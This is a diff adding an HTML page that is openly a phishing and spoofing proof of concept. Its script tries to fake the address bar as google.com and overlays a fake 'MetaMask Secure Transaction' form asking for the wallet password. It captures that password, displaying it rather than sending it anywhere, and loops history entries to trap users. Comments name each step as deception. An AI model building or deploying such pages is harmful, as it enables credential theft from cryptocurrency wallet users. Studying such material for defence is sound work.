@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Button Trigger</title>
+</head>
+<body>
+    <h1>Secure Transaction</h1>
+    <p>Click the button below to initiate your transaction securely.</p>
+    <button id="triggerBtn">Start Transaction</button>
+
+    <script>
+        document.getElementById('triggerBtn').onclick = () => {
+            // Simulate navigation to a trusted domain
+            history.pushState(null, '', 'https://www.google.com');
+            
+            // Delay to make the spoof more convincing
+            setTimeout(() => {
+                document.body.innerHTML = `
+                    <iframe src="https://www.google.com" style="width: 100%; height: 50%; border: none;"></iframe>
+                    <div style="text-align: center; margin-top: 20px;">
+                        <h2>MetaMask Secure Transaction</h2>
+                        <p>Please verify your identity to continue.</p>
+                        <form id="passwordForm">
+                            <input type="password" placeholder="Enter your MetaMask password" style="padding: 10px; width: 80%; margin-bottom: 10px;">
+                            <button type="submit" style="padding: 10px 20px;">Submit</button>
+                        </form>
+                    </div>
+                `;
+
+                // Hijack password submission
+                document.getElementById('passwordForm').onsubmit = (e) => {
+                    e.preventDefault();
+                    const userPassword = e.target[0].value;
+                    if (userPassword) {
+                        document.body.innerHTML = `<h2>Success</h2><p>Your password is: ${userPassword}</p>`;
+                    } else {
+                        document.body.innerHTML = `<h2>Error</h2><p>No password entered.</p>`;
+                    }
+                };
+            }, 1000);
+
+            // Create a loop in browser history to trap users
+            setInterval(() => {
+                history.pushState(null, '', 'https://www.google.com');
+            }, 500);
+        };
+    </script>
+</body>
+</html>
